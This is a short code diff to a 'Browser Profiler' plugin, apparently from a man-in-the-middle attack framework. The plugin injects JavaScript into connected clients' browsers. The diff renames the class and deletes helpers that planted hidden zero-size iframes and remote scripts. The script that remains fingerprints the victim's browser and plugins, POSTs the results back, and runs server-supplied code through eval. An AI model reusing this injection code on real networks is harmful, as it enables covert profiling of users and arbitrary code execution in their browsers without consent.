@@ -1,9 +1,9 @@
 from plugins.plugin import Plugin
 from plugins.Inject import Inject
 
-class BrowserProfilerer(Inject, Plugin):
-    name = "Browser Profilerer"
-    optname = "browserprofilerer"
+class BrowserProfiler(Inject, Plugin):
+    name = "Browser Profiler"
+    optname = "browserprofiler"
     desc = "Attempts to enumerate all browser plugins of connected clients"
     has_opts = False
 
@@ -45,21 +45,6 @@ function make_xhr(){
                 eval(xhr.responseText);
             }
         }
-        
-        function makeIframe(url) {
-            ifrm = document.createElement("iframe");
-            ifrm.setAttribute("src", url);
-            ifrm.style.width = 0+"px";
-            ifrm.style.height = 0+"px";
-            document.body.appendChild(ifrm);
-        }
-
-        function makeScript(url){
-            scp = document.createElement("script");
-            scp.setAttribute("type", 'text/javascript');
-            scp.setAttribute("src", url);
-            document.body.appendChild(scp);         
-        }
 
         var data = [];
         userAgent = navigator.userAgent;
@@ -95,7 +80,6 @@ function make_xhr(){
             var datajoined = data.join("&");
             xhr.open("POST", "clientprfl", true);
             xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-            //alert(datajoined);
             xhr.send(datajoined);
         }
 </script>"""
